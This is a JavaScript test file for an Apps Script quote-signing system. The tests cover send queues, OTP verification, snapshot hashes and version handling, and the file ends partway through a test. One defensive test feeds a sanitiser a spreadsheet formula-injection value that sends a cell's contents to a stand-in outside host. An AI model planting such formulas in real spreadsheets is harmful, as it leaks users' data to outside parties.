import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import vm from 'node:vm';
import {createHash} from 'node:crypto';
import {deflateSync,crc32} from 'node:zlib';
import schema from '../lib/domain/schema.json' with {type:'json'};
import {fakeAppsScript} from './helpers/fake-apps-script.mjs';

// Load both Apps Script files into one context, as they share one project.
const ctx=vm.createContext({});
for(const f of ['document-import.gs','quote-signing.gs'])vm.runInContext(readFileSync(new URL(`../apps-script/${f}`,import.meta.url),'utf8'),ctx);
const {SIGN_HEADERS,CASE_SIGN_HEADERS,QUOTE_SIGN_HEADERS,addWorkingDays,isoDay,isEmail,planSendQueue,findSignatureByTokenHash,pageStateFor,planSignedCase,buildSignEmail,escapeHtml,previousSendFor,planEffectiveQuotes,sendFailureNote,clearSendFailureNote,signBlockReason,validateSignature,buildCertificateHtml,signedDocumentRow,planSuperseded,quoteGroupKeys,signPageHtml_,sheetSafe,sheetSafeRow,missingHeaders,adminAllowed,pruneTries,
 SIGN_EVENT_HEADERS,isPngBytes,signedEventDocId,versionNumber,versionBlockReason,statusFromEvents,effectiveBlockReason,normalizeAmount,signSnapshotText,snapshotProblem,
 maskEmail,otpCodeFrom,otpVerify,otpSendBlock,buildOtpEmail,certificateFileName,findCertificateDoc,parseCertificateMeta,versionRecordFor}=ctx;

const signHeaders=Object.values(SIGN_HEADERS);
const sig=(o)=>{const r=signHeaders.map(()=>'');for(const[k,v]of Object.entries(o))r[signHeaders.indexOf(SIGN_HEADERS[k])]=v;return r;};
const queued=(id,caseId,extra={})=>sig({id,quoteId:'quo_'+id,caseId,sourceId:'doc_'+id,recipientEmail:'buyer@example.com',status:'待寄送',...extra});

const caseHeaders=Object.values(schema.collections.cases.columns);
const caseRow=(o)=>{const r=caseHeaders.map(()=>'');for(const[k,v]of Object.entries(o))r[caseHeaders.indexOf(CASE_SIGN_HEADERS[k])]=v;return r;};

test('signing script reads columns the dashboard schema defines',()=>{
 for(const h of Object.values(CASE_SIGN_HEADERS))assert.ok(caseHeaders.includes(h),`案件商機 ${h}`);
 const quoteHeaders=Object.values(schema.collections.quotes.columns);
 for(const h of Object.values(QUOTE_SIGN_HEADERS))assert.ok(quoteHeaders.includes(h),`報價版本 ${h}`);
 assert.equal(schema.collections.cases.sheet,'案件商機');
 assert.equal(schema.collections.quotes.sheet,'報價版本');
 assert.ok(!Object.values(schema.collections).some(c=>c.sheet==='簽署'),'簽署 is a new sheet, not one the dashboard validates yet');
});

test('working days skip weekends',()=>{
 assert.equal(addWorkingDays('2026-11-17',10),'2026-12-01'); // Tue + 10 working days
 assert.equal(addWorkingDays('2026-11-20',1),'2026-11-23'); // Fri -> Mon
 assert.equal(addWorkingDays('2026-11-21',1),'2026-11-23'); // Sat -> Mon
});

test('dates from the sheet become yyyy-mm-dd',()=>{
 assert.equal(isoDay('5/20/2026'),'2026-05-20');
 assert.equal(isoDay('2026-12-1'),'2026-12-01');
 assert.equal(isoDay(new Date(2026,10,17)),'2026-11-17');
 assert.equal(isoDay(''),'');
 assert.equal(isoDay('明天'),'');
});

test('recipient must be one e-mail address',()=>{
 assert.ok(isEmail('a@b.co'));
 assert.ok(!isEmail('a@b.co, c@d.co'));
 assert.ok(!isEmail('陳先生'));
});

test('draft queue: take valid rows, flag invalid ones, expire overdue',()=>{
 const rows=[
  sig({id:'sig_old',caseId:'case_A788',status:'已寄送',dueDate:'2026-12-01'}),
  sig({id:'sig_late',caseId:'case_A700',status:'已檢視',dueDate:'2026-11-10'}),
  sig({id:'sig_fine',caseId:'case_A701',status:'已寄送',dueDate:'2026-12-01'}),
  queued('sig_new','case_A788'),
  queued('sig_bad','case_A702',{recipientEmail:'陳先生'}),
  sig({id:'sig_done',caseId:'case_A788',status:'已簽回'}),
 ];
 const plan=planSendQueue(signHeaders,rows,'2026-11-17');
 assert.deepEqual([...plan.send],[3]);
 assert.deepEqual([...plan.invalid.map(p=>[p.index,p.reason])],[[4,'收件人Email 格式不正確']]);
 assert.equal(plan.void,undefined,'older links are closed by the version rules, not by the queue');
 assert.deepEqual([...plan.expire],[1]);
});

test('a missing header names the sheet',()=>{
 assert.throws(()=>planSendQueue(['簽署ID'],[], '2026-11-17'),/「簽署」分頁找不到欄位「報價ID」/);
});

test('token lookup and page state',()=>{
 const rows=[sig({id:'a',tokenHash:'h1'}),sig({id:'b',tokenHash:'h2'})];
 assert.equal(findSignatureByTokenHash(signHeaders,rows,'h2'),1);
 assert.equal(findSignatureByTokenHash(signHeaders,rows,'nope'),-1);
 assert.equal(findSignatureByTokenHash(signHeaders,rows,''),-1);
 assert.equal(pageStateFor('已寄送','2026-12-01','2026-11-17'),'open');
 assert.equal(pageStateFor('已檢視','2026-11-10','2026-11-17'),'expired');
 assert.equal(pageStateFor('已作廢','','2026-11-17'),'voided');
 assert.equal(pageStateFor('已簽回','','2026-11-17'),'signed');
 assert.equal(pageStateFor('待寄送','','2026-11-17'),'invalid');
 // A sent link without a readable expiry date is not signable.
 assert.equal(pageStateFor('已寄送','','2026-11-17'),'invalid');assert.equal(pageStateFor('已檢視',null,'2026-11-17'),'invalid');
});

test('first signature fills the deal fields and marks the case won',()=>{
 const plan=planSignedCase(caseHeaders,caseRow({id:'case_A788',status:'已報價待確認'}),'2026-11-20','doc_signed1');
 assert.deepEqual({...plan.set},{signedSourceId:'doc_signed1',decisionDate:'2026-11-20',status:'已成交'});
 assert.equal(plan.revision,false);
 assert.equal(plan.conflicts.length,0);
});

test('a re-signed revision keeps the original deal date and fills the revision fields',()=>{
 const row=caseRow({id:'case_A780',status:'已成交',signedSourceId:'doc_first',decisionDate:'9/30/2026'});
 const plan=planSignedCase(caseHeaders,row,'2026-11-20','doc_second');
 assert.equal(plan.revision,true);
 assert.deepEqual({...plan.set},{revisionSignedDate:'2026-11-20',revisionSignedSourceId:'doc_second'});
});

test('filled cells are never overwritten; differences go to review',()=>{
 const row=caseRow({id:'case_A788',status:'未成交',decisionDate:'11/18/2026'});
 const plan=planSignedCase(caseHeaders,row,'2026-11-20','doc_signed1');
 assert.deepEqual({...plan.set},{signedSourceId:'doc_signed1'});
 assert.equal(plan.conflicts.length,2);
 assert.match(plan.conflicts[0],/成交決策日已有「2026-11-18」/);
 assert.match(plan.conflicts[1],/商機狀態為「未成交」/);
});

test('marking the same signed document twice changes nothing',()=>{
 const row=caseRow({id:'case_A788',status:'已成交',signedSourceId:'doc_signed1',decisionDate:'11/20/2026'});
 const plan=planSignedCase(caseHeaders,row,'2026-11-20','doc_signed1');
 assert.equal(plan.revision,false);
 assert.deepEqual({...plan.set},{});
 assert.equal(plan.conflicts.length,0);
});

test('signing e-mail carries the link, amount and due date, and escapes HTML',()=>{
 const m=buildSignEmail({title:'A788 <示範品牌>',gross:'1,234,567',recipientName:'陳先生',link:'https://script.google.com/macros/s/X/exec?t=abc',due:'2026-12-01'});
 assert.equal(m.subject,'【沃克思國際有限公司】報價單簽署：A788 <示範品牌>');
 assert.match(m.text,/陳先生 您好/);
 assert.match(m.text,/NT\$ 1,234,567/);
 assert.match(m.text,/exec\?t=abc/);
 assert.match(m.html,/A788 &lt;示範品牌&gt;/);
 assert.ok(!m.html.includes('<示範品牌>'));
 assert.match(m.text,/驗證碼到這個信箱/);
 assert.equal(escapeHtml(`"'&`),'&quot;&#39;&amp;');
});

const quoteHeaders=Object.values(schema.collections.quotes.columns);
const quote=(o)=>{const r=quoteHeaders.map(()=>'');for(const[k,v]of Object.entries(o))r[quoteHeaders.indexOf(QUOTE_SIGN_HEADERS[k])]=v;return r;};
const changes=(c)=>[...c.map(x=>[x.index,x.value])];

test('revision before signing: the e-mail for V2 says it replaces V1',()=>{
 const rows=[
  sig({id:'sig_v1',caseId:'case_A788',status:'已檢視',sentAt:'2026-11-17',dueDate:'2026-12-01'}),
  queued('sig_v2','case_A788'),
 ];
 const plan=planSendQueue(signHeaders,rows,'2026-11-19');
 assert.deepEqual([...plan.send],[1]);
 const prev=previousSendFor(signHeaders,rows,1);
 assert.equal(prev.id,'sig_v1');
 assert.equal(prev.sentDay,'2026-11-17');
 const m=buildSignEmail({title:'A788 V2',gross:3000000,link:'L',due:'2026-12-03',replaces:prev.sentDay});
 assert.match(m.subject,/報價單更新版簽署/);
 assert.match(m.text,/取代 2026-11-17 寄出的版本，先前的確認連結已失效/);
 assert.equal(previousSendFor(signHeaders,[queued('sig_only','case_A790')],0),null,'first send is not an update');
});

test('revision after signing: the new version becomes effective and the old one is switched off',()=>{
 const quotes=[
  quote({id:'quo_v1',caseId:'case_A788',version:'V1',role:'原案',effective:'是'}),
  quote({id:'quo_v2',caseId:'case_A788',version:'V2',role:'原案',effective:'否'}),
  quote({id:'quo_other',caseId:'case_A700',effective:'是'}),
 ];
 assert.deepEqual(changes(planEffectiveQuotes(quoteHeaders,quotes,'case_A788','quo_v2')),[[0,'否'],[1,'是']]);
 const row=caseRow({id:'case_A788',status:'已成交',signedSourceId:'doc_v1signed',decisionDate:'11/20/2026'});
 const plan=planSignedCase(caseHeaders,row,'2026-12-05','doc_v2signed');
 assert.equal(plan.revision,true);
 assert.deepEqual({...plan.set},{revisionSignedDate:'2026-12-05',revisionSignedSourceId:'doc_v2signed'});
});

test('complementary quotes and other quote groups stay effective',()=>{
 const quotes=[
  quote({id:'quo_a',caseId:'case_A776',groupId:'g1',role:'互補',effective:'是'}),
  quote({id:'quo_b',caseId:'case_A776',groupId:'g1',role:'互補',effective:'否'}),
  quote({id:'quo_c',caseId:'case_A776',groupId:'g2',role:'原案',effective:'是'}),
 ];
 assert.deepEqual(changes(planEffectiveQuotes(quoteHeaders,quotes,'case_A776','quo_b')),[[1,'是']]);
 assert.deepEqual(changes(planEffectiveQuotes(quoteHeaders,quotes,'case_A776','quo_missing')),[]);
});

test('an add-on is its own case: queuing it leaves the signed original alone',()=>{
 const rows=[
  sig({id:'sig_main',caseId:'case_A788',status:'已簽回',sentAt:'2026-11-17'}),
  sig({id:'sig_v1open',caseId:'case_A788',status:'已寄送',sentAt:'2026-11-18',dueDate:'2026-12-02'}),
  queued('sig_add','case_A788-addition'),
 ];
 const plan=planSendQueue(signHeaders,rows,'2026-11-20');
 assert.deepEqual([...plan.send],[2]);
 assert.equal(previousSendFor(signHeaders,rows,2),null);
 const first=planSignedCase(caseHeaders,caseRow({id:'case_A788-addition',status:'已報價待確認'}),'2026-11-25','doc_add');
 assert.equal(first.revision,false);
 assert.equal(first.set.status,'已成交');
});

test('a row left in 寄送中 is reported as interrupted and never re-sent',()=>{
 const rows=[sig({id:'sig_x',quoteId:'quo_x',caseId:'case_A',sourceId:'doc_x',recipientEmail:'buyer@example.com',status:'寄送中'}),sig({id:'sig_old',caseId:'case_A',status:'已寄送',dueDate:'2026-12-01'})];
 const plan=planSendQueue(signHeaders,rows,'2026-11-17');
 assert.deepEqual([...plan.send],[]);
 assert.deepEqual([...plan.interrupted],[0]);
 assert.equal(pageStateFor('寄送中','2026-12-01','2026-11-17'),'invalid');
 assert.equal(pageStateFor('寄送失敗','2026-12-01','2026-11-17'),'invalid');
});

test('send failures count up, keep the existing note and give up at the limit',()=>{
 const a=sendFailureNote('老闆備註','Drive 逾時',3);
 assert.equal(a.notes,'老闆備註 ｜寄送失敗 1/3：Drive 逾時');
 assert.equal(a.giveUp,false);
 const b=sendFailureNote(a.notes,'Drive 逾時',3);
 assert.equal(b.notes,'老闆備註 ｜寄送失敗 2/3：Drive 逾時');
 const c=sendFailureNote(b.notes,'PDF 不符',3);
 assert.equal(c.attempts,3);
 assert.equal(c.giveUp,true);
 assert.equal(c.notes,'老闆備註 ｜寄送失敗 3/3：PDF 不符');
 assert.equal(sendFailureNote('','x',3).notes,'寄送失敗 1/3：x');
 assert.equal(clearSendFailureNote(c.notes),'老闆備註');
 assert.equal(clearSendFailureNote('老闆備註'),'老闆備註');
});

test('only a quote that reached the client can be marked signed',()=>{
 for(const s of ['已寄送','已檢視','已過期'])assert.equal(signBlockReason(s),'',s);
 for(const s of ['草稿','待寄送','寄送中','寄送失敗','已拒絕',''])assert.match(signBlockReason(s),/尚未寄達/,s);
 assert.match(signBlockReason('已作廢'),/最新版本/);
});

// A real 40x20 grey PNG with noise, so it is long enough and has a proper IHDR … IEND structure.
const realPng=(()=>{
 const chunk=(type,data)=>{const len=Buffer.alloc(4);len.writeUInt32BE(data.length);const td=Buffer.concat([Buffer.from(type),data]);const crc=Buffer.alloc(4);crc.writeUInt32BE(crc32(td));return Buffer.concat([len,td,crc]);};
 const ihdr=Buffer.alloc(13);ihdr.writeUInt32BE(40,0);ihdr.writeUInt32BE(20,4);ihdr[8]=8;ihdr[9]=0;
 const raw=Buffer.alloc(20*41);let x=7;for(let i=0;i<raw.length;i++){x=(x*1103515245+12345)&0x7fffffff;raw[i]=i%41===0?0:x>>16&0xff;}
 return Buffer.concat([Buffer.from([0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a]),chunk('IHDR',ihdr),chunk('IDAT',deflateSync(raw)),chunk('IEND',Buffer.alloc(0))]).toString('base64');
})();
const png='data:image/png;base64,'+realPng;
test('a signature needs a name, a drawn PNG and consent',()=>{
 assert.match(validateSignature({name:'',image:png,consent:true}).error,/姓名/);
 assert.match(validateSignature({name:'王小明',image:png}).error,/同意/);
 assert.match(validateSignature({name:'王小明',image:'data:image/png;base64,AAAA',consent:true}).error,/簽名/);
 assert.match(validateSignature({name:'王小明',image:'data:text/html;base64,'+'A'.repeat(400),consent:true}).error,/簽名/);
 assert.match(validateSignature({name:'王小明',image:'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg'+'A'.repeat(600002),consent:true}).error,/過大/);
 assert.match(validateSignature({name:'王小明',image:png,consent:true}).error,/驗證碼/);
 assert.match(validateSignature({name:'王小明',image:png,consent:true,code:'12345'}).error,/驗證碼/);
 const ok=validateSignature({name:' 王小明 ',title:'採購經理',image:png,consent:true,agent:'x'.repeat(500),code:' 012345 '});
 assert.equal(ok.name,'王小明');
 assert.equal(ok.imageBase64,realPng);
 assert.match(validateSignature({name:'王小明',image:'data:image/png;base64,'+'A'.repeat(400),consent:true,code:'123456'}).error,/簽名/,'base64 that is not a PNG');
 assert.equal(ok.agent.length,300);
 assert.equal(ok.code,'012345');
});

test('certificate shows the signer and the file hash, and escapes what the client typed',()=>{
 const html=buildCertificateHtml({title:'A788 報價單',date:'2026-11-18',gross:1234567,name:'<b>王</b>',signerTitle:'經理',signedAt:'2026-11-18 10:00:00',recipientEmail:'buyer@example.com',signId:'sig_1',filename:'A788.pdf',sha256:'ab'.repeat(32),agent:'UA',imageBase64:'QUJD'});
 assert.ok(html.includes('&lt;b&gt;王&lt;/b&gt;'));
 assert.ok(!html.includes('<b>王</b>'));
 assert.ok(html.includes('ab'.repeat(32)));
 assert.ok(html.includes('NT$ 1,234,567'));
 assert.ok(html.includes('data:image/png;base64,QUJD'));
});

test('the certificate is registered in 文件 in the dashboard column order',()=>{
 const docHeaders=Object.values(schema.collections.documents.columns);
 const row=signedDocumentRow(docHeaders,{id:'doc_abc',filename:'A788-簽回證明.pdf',url:'https://drive.google.com/file/d/abcdefghijk/view',sha256:'ff',caseNumber:'A788'});
 assert.equal(row.length,docHeaders.length);
 assert.deepEqual([...row],['doc_abc','簽回','A788-簽回證明.pdf','https://drive.google.com/file/d/abcdefghijk/view','ff','A788','','','已處理']);
});

test('signing page shows the signature form only while the link is open',()=>{
 const token='a'.repeat(64);
 const open=signPageHtml_({state:'open',title:'A788 <報價>',date:'2026-11-18',gross:100,due:'2026-12-02'},token);
 assert.ok(open.includes('<canvas id="pad">'));
 assert.ok(open.includes('submitSignature'));
 assert.ok(open.includes('A788 &lt;報價&gt;'));
 for(const state of ['signed','voided','expired','declined','invalid']){
  const html=signPageHtml_({state},token);
  assert.ok(!html.includes('<canvas'),state);
  assert.ok(!html.includes(token),state);
 }
});

const quoteHeaders2=Object.values(schema.collections.quotes.columns);
const quo=(o)=>{const r=quoteHeaders2.map(()=>'');for(const[k,v]of Object.entries(o))r[quoteHeaders2.indexOf(QUOTE_SIGN_HEADERS[k])]=v;return r;};
test('a higher version replaces the open link of the same quote group, not complementary quotes or other groups',()=>{
 const quotes=[
  quo({id:'quo_v1',caseId:'case_A',groupId:'g1',version:'V1'}),quo({id:'quo_v2',caseId:'case_A',groupId:'g1',version:'V2'}),
  quo({id:'quo_other',caseId:'case_A',groupId:'g2',version:'V1'}),
  quo({id:'quo_c1',caseId:'case_B',groupId:'g3',role:'互補',version:'V1'}),quo({id:'quo_c2',caseId:'case_B',groupId:'g3',role:'互補',version:'V1'}),
 ];
 const sup=(rows)=>planSuperseded(signHeaders,rows,quoteHeaders2,quotes);
 const at=(d)=>new Date(2026,10,d);
 const rows=[
  sig({id:'sig_v1',quoteId:'quo_v1',caseId:'case_A',status:'已檢視',sentAt:at(10)}),
  sig({id:'sig_v2',quoteId:'quo_v2',caseId:'case_A',status:'已寄送',sentAt:at(15)}),
  sig({id:'sig_other',quoteId:'quo_other',caseId:'case_A',status:'已寄送',sentAt:at(11)}),
  sig({id:'sig_c1',quoteId:'quo_c1',caseId:'case_B',status:'已寄送',sentAt:at(10)}),
  sig({id:'sig_c2',quoteId:'quo_c2',caseId:'case_B',status:'已寄送',sentAt:at(12)}),
  sig({id:'sig_draft',quoteId:'quo_v2',caseId:'case_A',status:'待寄送'}),
 ];
 assert.deepEqual([...sup(rows).map(v=>[v.index,v.by])],[[0,'sig_v2']]);
 // A signed newer version also closes the older open link; a signed older one is left as the record it is.
 rows[1]=sig({id:'sig_v2',quoteId:'quo_v2',caseId:'case_A',status:'已簽回',sentAt:at(15)});
 assert.deepEqual([...sup(rows).map(v=>v.index)],[0]);
 rows[0]=sig({id:'sig_v1',quoteId:'quo_v1',caseId:'case_A',status:'已簽回',sentAt:at(10)});
 rows[1]=sig({id:'sig_v2',quoteId:'quo_v2',caseId:'case_A',status:'已寄送',sentAt:at(15)});
 assert.deepEqual([...sup(rows)],[]);
});

test('text typed on the public page or taken from a file name stays text in the sheet',()=>{
 assert.equal(sheetSafe('=IMAGE("https://x.test/"&A1)'),'\'=IMAGE("https://x.test/"&A1)');
 for(const v of ['+1','-x','@me'])assert.equal(sheetSafe(v),"'"+v);
 for(const v of ['王小明','A123 報價單.pdf','',0,-5,true,null])assert.equal(sheetSafe(v),v);
 const d=new Date(2026,10,21);assert.equal(sheetSafe(d),d);
 assert.deepEqual([...sheetSafeRow(['evt_1','=1+1',3])],['evt_1',"'=1+1",3]);
});

test('only a known trigger or a signed-in person may run the mail, trigger and write functions',()=>{
 assert.equal(adminAllowed({triggerUid:'123'},['123','456'],''),true);
 assert.equal(adminAllowed(undefined,['123'],'owner@example.com','Owner@example.com'),true);
 // A same-domain visitor of the public page is active but the page runs as the owner.
 assert.equal(adminAllowed(undefined,['123'],'visitor@example.com','owner@example.com'),false);
 assert.equal(adminAllowed(undefined,['123'],'owner@example.com',''),false);
 // The public page: nobody signed in, and a made-up trigger id does not help.
 assert.equal(adminAllowed(undefined,['123'],''),false);
 assert.equal(adminAllowed({triggerUid:'999'},['123'],''),false);
 assert.equal(adminAllowed({triggerUid:'123'},[],'  '),false);
});

test('the importer refuses to write when a column it relies on is missing',()=>{
 assert.deepEqual([...missingHeaders(['報價ID',' 案件ID ','來源文件ID'],['報價ID','案件ID','來源文件ID'])],[]);
 assert.deepEqual([...missingHeaders(['報價ID','案件ID','來源文件'],['報價ID','案件ID','來源文件ID'])],['來源文件ID']);
});

test('stored OCR tries keep only files still listed and still without a row, within a size cap',()=>{
 const kept=pruneTries({doc_a:3,doc_b:1,doc_c:2},{doc_b:true},['doc_a','doc_b']);
 assert.deepEqual({...kept},{doc_a:3});
 // Over the cap, files that used up their tries go first; files still being tried stay.
 const capped=pruneTries({x1:3,x2:3,x3:1,x4:2},{},['x1','x2','x3','x4'],3);
 assert.deepEqual(Object.keys(capped).sort(),['x2','x3','x4']);
});

test('a queued row without a case id is not sent',()=>{
 const plan=planSendQueue(signHeaders,[queued('sig_nocase','')],'2026-11-17');
 assert.deepEqual([...plan.send],[]);assert.equal(plan.invalid[0].reason,'缺少案件ID');
});

// ---------- Design gaps of the 2026-11 review: signer check, snapshot, versions, idempotency, no auto-send ----------

const docHeaders=Object.values(schema.collections.documents.columns);
const rowOf=(headers,o)=>{const r=headers.map(()=>'');for(const[h,v]of Object.entries(o))r[headers.indexOf(h)]=v;return r;};
const sha=(s)=>createHash('sha256').update(s).digest('hex');
const payload={name:'王小明',title:'採購經理',consent:true,image:png,agent:'UA'};

/** A workbook with one case and one quote (one PDF) per version, all in quote group g1. */
function signingWorld({versions=['V1'],gross=1200000}={}){
 const rt=fakeAppsScript({sheets:{
  '簽署':[signHeaders],'簽署事件':[[...SIGN_EVENT_HEADERS]],'報價版本':[quoteHeaders],
  '案件商機':[caseHeaders,caseRow({id:'case_A701',status:'已報價待確認'})],'文件':[docHeaders],
  '設定':[['鍵','值','說明'],['sign_webapp_url','https://script.google.com/macros/s/X/exec','']],
 }});
 versions.forEach((v,i)=>{
  const n=i+1;
  const f=rt.newFile(`A701 示範品牌-報價單${v}.pdf`,Buffer.from('%PDF-1.4 quote '+v),rt.folder);
  rt.book['文件'].appendRow(rowOf(docHeaders,{'文件ID':'doc_q'+n,'文件類型':'報價單','原始檔名':f.name,'文件連結':f.getUrl()}));
  rt.book['報價版本'].appendRow(quote({id:'quo_'+n,caseId:'case_A701',title:'A701 示範品牌活動',version:v,groupId:'g1',gross,effective:'否',sourceId:'doc_q'+n}));
 });
 return rt;
}
const queue=(rt,n,extra={})=>rt.book['簽署'].appendRow(sig({id:'sig_'+n,quoteId:'quo_'+n,caseId:'case_A701',sourceId:'doc_q'+n,recipientName:'陳先生',recipientEmail:'buyer@example.com',status:'待寄送',...extra}));
/** Queues quote n, runs the menu and returns the token from the draft's link. */
function issue(rt,n){
 queue(rt,n);
 const before=rt.log.drafts.length;
 rt.ctx.createSignDrafts();
 const d=rt.log.drafts[before];
 assert.ok(d,'a draft was created for quo_'+n);
 return /[?&]t=([0-9a-f]{64})/.exec(d.body)[1];
}
const findRow=(rt,sheet,header,value)=>{const data=rt.book[sheet].data;const c=data[0].indexOf(header);return data.find((r,i)=>i>0&&r[c]===value);};
const setCell=(rt,sheet,keyHeader,key,header,value)=>{const r=findRow(rt,sheet,keyHeader,key);r[rt.book[sheet].data[0].indexOf(header)]=value;};
const signRow=(rt,id)=>{const r=findRow(rt,'簽署','簽署ID',id);return Object.fromEntries(Object.entries(SIGN_HEADERS).map(([k,h])=>[k,r[signHeaders.indexOf(h)]]));};
const mailedCode=(rt)=>/(\d{6})/.exec(rt.log.sent.at(-1).body)[1];
const pageHtml=(rt,token)=>rt.ctx.doGet({parameter:{t:token}}).html;

test('gap 5: nothing mails a client on its own; the menu only makes Gmail drafts',()=>{
 const rt=signingWorld();
 rt.addTrigger('processSendQueue');rt.addTrigger('importDocuments');
 rt.ctx.installSigning();
 assert.deepEqual(rt.triggers.map(t=>t.handler),['importDocuments'],'the old 5-minute send trigger is removed and none is added');
 assert.equal(typeof rt.ctx.processSendQueue,'undefined','an old trigger left by another account has nothing to run');
 const token=issue(rt,1);
 assert.equal(rt.log.sent.length,0,'no e-mail is sent');
 assert.equal(rt.log.drafts.length,1);
 assert.equal(rt.log.drafts[0].to,'buyer@example.com');
 assert.match(rt.log.drafts[0].body,/驗證碼/);
 const row=signRow(rt,'sig_1');
 assert.equal(row.status,'已寄送');
 assert.equal(row.tokenHash,sha(token));
 assert.match(row.snapshot,/^[0-9a-f]{64}$/);
 assert.equal(row.sha256,sha('%PDF-1.4 quote V1'));
 assert.throws(()=>rt.ctx.createSignDrafts({triggerUid:'1'}),/選單/);
 const items=[];rt.ctx.addSigningMenu_({addSeparator(){return this;},addItem(label,fn){items.push(fn);return this;}});
 assert.ok(!items.includes('processSendQueue'));
});

test('gap 1: only the recipient can sign — the code goes to the registered address and is required',()=>{
 const rt=signingWorld();
 const token=issue(rt,1);
 assert.match(pageHtml(rt,token),/b\*\*\*@example\.com/);
 assert.throws(()=>rt.ctx.submitSignature(token,payload),/驗證碼/);
 assert.throws(()=>rt.ctx.submitSignature(token,{...payload,code:'000000'}),/先按「寄送驗證碼」/);
 assert.equal(rt.ctx.requestSignCode(token).sentTo,'b***@example.com');
 const mail=rt.log.sent.at(-1);
 assert.equal(mail.to,'buyer@example.com');
 assert.ok(!/示範品牌|1,200,000|A701/.test(mail.subject+mail.body),'the code e-mail says nothing about the quote');
 assert.throws(()=>rt.ctx.requestSignCode(token),/一分鐘/);
 const code=mailedCode(rt);
 const wrong=code==='111111'?'222222':'111111';
 assert.throws(()=>rt.ctx.submitSignature(token,{...payload,code:wrong}),/不正確/);
 assert.notEqual(signRow(rt,'sig_1').status,'已簽回');
 assert.equal(rt.ctx.submitSignature(token,{...payload,code}).ok,true);
 const row=signRow(rt,'sig_1');
 assert.equal(row.status,'已簽回');
 assert.equal(row.signer,'王小明');
 // The verified code stays for its 10 minutes only to fetch the certificate again; it signs nothing else.
 const again=rt.ctx.submitSignature(token,{...payload,code});
 assert.match(again.name,/^sig_1-簽回證明-/);
 assert.equal(rt.ctx.submitSignature(token,{...payload,code:wrong}).data,undefined);
});

test('gap 1: five wrong codes spend the code; at most five codes a day, one a minute',()=>{
 const stored={hash:'h',exp:2000,tries:3};
 assert.deepEqual({...otpVerify(stored,'x',1000).stored},{hash:'h',exp:2000,tries:4});
 const fifth=otpVerify({...stored,tries:4},'x',1000);
 assert.match(fifth.error,/次數過多/);assert.equal(fifth.stored,null);
 assert.match(otpVerify(stored,'h',2001).error,/過期/);
 assert.equal(otpVerify(stored,'h',1000).ok,true);
 assert.match(otpVerify(null,'h',1000).error,/寄送驗證碼/);
 const now=Date.UTC(2026,10,21,12);
 const ev=(min,id='sig_1',type='寄驗證碼')=>['evt',id,type,new Date(now-min*60000),'','',''];
 assert.equal(otpSendBlock([ev(5),ev(30),ev(60*30)],'sig_1',now),'');
 assert.match(otpSendBlock([ev(0.5)],'sig_1',now),/一分鐘/);
 assert.match(otpSendBlock([ev(5),ev(10),ev(20),ev(30),ev(40)],'sig_1',now),/5 次/);
 assert.equal(otpSendBlock([ev(5,'sig_2'),ev(10,'sig_1','檢視')],'sig_1',now),'');
 assert.match(otpCodeFrom('ffffffffffff-aaaa'),/^\d{6}$/);
 assert.equal(maskEmail('buyer@example.com'),'b***@example.com');
 assert.equal(maskEmail('不是信箱'),'');
 assert.match(buildOtpEmail('012345').text,/012345/);
});

test('gap 2: a change to amount, PDF, recipient or case after the link was made blocks signing',()=>{
 const changes={
  amount:(rt)=>setCell(rt,'報價版本','報價ID','quo_1','含稅金額',1300000),
  pdf:(rt)=>{[...rt.files.values()][0].bytes=Buffer.from('%PDF-1.4 edited');},
  recipient:(rt)=>setCell(rt,'簽署','簽署ID','sig_1','收件人Email','someone-else@example.com'),
  case:(rt)=>{setCell(rt,'簽署','簽署ID','sig_1','案件ID','case_A702');setCell(rt,'報價版本','報價ID','quo_1','案件ID','case_A702');},
  'missing snapshot':(rt)=>setCell(rt,'簽署','簽署ID','sig_1','快照雜湊',''),
 };
 const control=signingWorld();
 assert.ok(pageHtml(control,issue(control,1)).includes('<canvas'),'an untouched link is open');
 for(const[name,change]of Object.entries(changes)){
  const rt=signingWorld();
  const token=issue(rt,1);
  change(rt);
  const html=pageHtml(rt,token);
  assert.ok(!html.includes('<canvas'),name);
  assert.match(html,/重新確認/,name);
  assert.throws(()=>rt.ctx.requestSignCode(token),/重新確認/,name);
  assert.throws(()=>rt.ctx.downloadQuotePdf(token),/無法下載/,name);
  assert.throws(()=>rt.ctx.submitSignature(token,{...payload,code:'123456'}),/重新確認/,name);
  assert.equal(rt.log.sent.length,0,name);
  rt.ui.prompts.push('sig_1','doc_q1');rt.ctx.markSignedFromMenu();
  assert.match(rt.log.alerts.at(-1),/未標記/,name+': the menu refuses too');
 }
});

test('gap 2: a link written directly as 已寄送 needs the documented snapshot formula',()=>{
 const rt=signingWorld();
 const token='c'.repeat(64);
 const pdf=sha('%PDF-1.4 quote V1');
 const fields={id:'sig_9',quoteId:'quo_1',caseId:'case_A701',sourceId:'doc_q1',recipientEmail:'Buyer@Example.com',status:'已寄送',tokenHash:sha(token),sentAt:new Date(),dueDate:'2099-12-31',sha256:pdf};
 rt.book['簽署'].appendRow(sig(fields));
 assert.ok(!pageHtml(rt,token).includes('<canvas'),'no snapshot, no signing');
 // QUOTE-SIGNING-zh-TW.md: SHA256 of these lines joined by \n; amount in whole dollars, hash and e-mail lower case.
 const documented=sha(['quote-sign-v1','sig_9','quo_1','case_A701','doc_q1',pdf,'1200000','V1','g1','buyer@example.com'].join('\n'));
 assert.equal(signSnapshotText({signId:'sig_9',quoteId:'quo_1',caseId:'case_A701',sourceId:'doc_q1',pdfSha256:pdf.toUpperCase(),gross:'NT$1,200,000',version:'V1',groupId:'g1',recipientEmail:' Buyer@Example.com '}),
  ['quote-sign-v1','sig_9','quo_1','case_A701','doc_q1',pdf,'1200000','V1','g1','buyer@example.com'].join('\n'));
 setCell(rt,'簽署','簽署ID','sig_9','快照雜湊',documented);
 assert.ok(pageHtml(rt,token).includes('<canvas'));
 assert.equal(normalizeAmount('1,234,567.4'),'1234567');
 assert.equal(normalizeAmount(''),'');
 assert.match(snapshotProblem({rowSha:'',storedSnapshot:'x'}),/原檔SHA256/);
});

test('gap 3: an older or voided version never becomes signable again',()=>{
 const rt=signingWorld({versions:['V1','V2']});
 const t1=issue(rt,1);
 const t2=issue(rt,2);
 assert.equal(signRow(rt,'sig_1').status,'已作廢','issuing V2 closes V1');
 rt.ui.prompts.push('sig_2');rt.ctx.voidSignatureFromMenu();
 assert.equal(signRow(rt,'sig_2').status,'已作廢');
 // Someone types the old statuses back into the sheet.
